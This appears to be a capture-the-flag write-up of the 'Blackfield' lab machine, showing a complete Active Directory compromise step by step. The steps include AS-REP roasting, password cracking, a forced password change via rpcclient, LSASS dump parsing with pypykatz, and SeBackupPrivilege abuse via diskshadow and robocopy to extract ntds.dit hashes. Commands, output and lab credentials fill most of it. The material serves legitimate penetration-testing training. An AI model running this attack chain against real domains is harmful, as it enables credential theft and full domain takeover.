# Blackfield

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.105.19
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 06:53 EDT
Nmap scan report for 10.129.105.19
Host is up (0.0078s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman
```

### ASREP-Roasting

`enum4linux` doesn't reveal much for us with NULL credentials, and only revealed the domain name:

```
Domain Name: BLACKFIELD                                                                      
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290
```

But we can find some shares using `smbmap`:

```
$ smbmap -u'guest' -p '' -H 10.129.105.19
[+] IP: 10.129.105.19:445       Name: 10.129.105.19                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```

When we connect to the `profiles$` share, we find a huge list of directories and usernames:

```
$ smbclient -N //10.129.105.19/profiles$                                 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  <TRUNCATED>
```

There aren't any files within these directories, so I just compiled all the usernames into a list. There were over 300 different usernames. I tried to brute force SMB with `crackmapexec`, but no username served as a password.&#x20;

When trying ASREP-Roasting, it worked and we could get a hash for the `support` user.&#x20;

```bash
$ impacket-GetNPUsers blackfield.local/ -dc-ip 10.129.105.19 -usersfile users -outputfile hashes.asreproast
$ cat hashes.asreproast
$krb5asrep$23$support@BLACKFIELD.LOCAL:05a0cabfcc50e33745e2e89eefc310e4$419bbe29f6524d207946bf2c7a85d10c0b9fb7e2ee0539fb56de42e6140225b474ee337222074af7822f46d204e0681c257dc23b4652d3d30e08423df6b6b1e7167906a863d076a10fcac807ab4c8bfe972a993a3729ca87fd7fd65997bb84b7368691cabf62506880dcced356153685d65bca7f62b22b661f19f750c80b66774881efff55c6351e9c3027c7a7654bb470ef4ff1589738dd8191bdc5c38248c072478518c62d7d169aed727dc0f47a75b93e296cd90328b3a6a875e6a2db3f13769160e438c48664d5e81dcc68e2e3e79e5b8fb9af6288739bbbe7626ea5997d9c3691123afc869624bb2a299f5e1cc088bac9bf
```

We can crack this hash using `john`.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:07 DONE (2023-05-07 07:28) 0.1254g/s 1798Kp/s 1798Kc/s 1798KC/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Bloodhound --> Change Password

This user had no access to any new shares. However, we can use `bloodhound-python` to find more information about the domain and this user.&#x20;

```bash
$ bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.105.19 -c all --dns-tcp
```

After uploading the data to Bloodhound, we can view what the `support` user can do. It appears `support` has ForceChangePassword privileges over `audit2020`.

<figure><img src="../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

`rpcclient` can be used to exploit this and change the password of this user to something else. Take note that there's a password policy present, and it can reject the change if the password does not meet the requirements:

```
$ rpcclient -U support 10.129.105.19
Password for [WORKGROUP\support]:
rpcclient $> setuserinfo2 audit2020 23 'password123'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'Password@123'
```

### Forensic Share

With this new password, we can check what shares are available to our new user:

```
$ smbmap -u audit2020 -p 'Password@123' -H 10.129.105.19
[+] IP: 10.129.105.19:445       Name: blackfield.local                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

We can read the `forensic` share:

```
$ smbclient -U audit2020 //10.129.105.19/forensic       
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020
```

Within the `memory_analysis` file, there was a `lsass.zip` file:

```
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020
```

Local Security Authority Subsystem Service (LSASS) is a process that deals with Windows Security, and it does store the authentication credentials like hashes or Kerberos tickets in memory. If this is a memory dump, then we might be able to view the passwords by dumping it out.

We can download the file and then `unzip` it.

```
$ unzip lsass.zip    
Archive:  lsass.zip
  inflating: lsass.DMP
```

Then, using `pypykatz`, we can dump it out without going to a Windows machine to run `mimikatz`. Here's the interesting parts of the dump:

```
$ pypykatz lsa minidump lsass.DMP
Username: svc_backup
Domain: BLACKFIELD
LM: NA
NT: 9658d1d1dcd9250115e2205d9f48400d
SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
DPAPI: a03cd8e9d30171f3cfe8caad92fef621

Username: Administrator
Domain: BLACKFIELD
LM: NA
NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
DPAPI: 240339f898b6ac4ce3f34702e4a89550

Username: DC01$
Domain: BLACKFIELD
LM: NA
NT: b624dc83a27cc29da11d9bf25efea796
SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
DPAPI: NA
```

Unfortunately, the hash for the administrator doesn't work. However, the one for `svc_backup` works and we can login:

<figure><img src="../../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SeBackupPrivilege Fail

We can check the user privileges to see that we have a lot enabled.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We have the `SeBackupPrivilege` enabled, which allows us to save the `sam` and `system` files from the registry. We can then use `secretsdump.py` to retrieve the updated hashes for the Administrator.&#x20;

Within `evil-winrm`, run the following:

```
reg save HKLM\sam sam
reg save HKLM\system system
download sam
download system
```

Once we have these files on our system, use `secretsdump.py` to extract the hashes.

```
$ secretsdump.py -sam sam -system system LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

When trying to pass the hash however, this hash **does not work**.

### NTDS Dump

Since we can save any file, let's try to save the Administrator's NTDS.dit file instead. There are a few walkthroughs out there on how to exploit this using `diskshadow`.

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

This would involve creating a Disk `Z:` that would contain the `ntds.dit` file that we want. Put this into a text file:

```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

Then, run `robocopy` to copy the `ntds.dit` file over amd download it.&#x20;

```
robocopy /b E:\Windows\ntds . ntds.dit
download ntds.dit
```

We can then use `secretsdump.py` again to read the hashes.&#x20;

```
$ secretsdump.py -ntds ntds.dit -system system LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

This time, the hash works and we can get a shell using `evil-winrm`.

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>
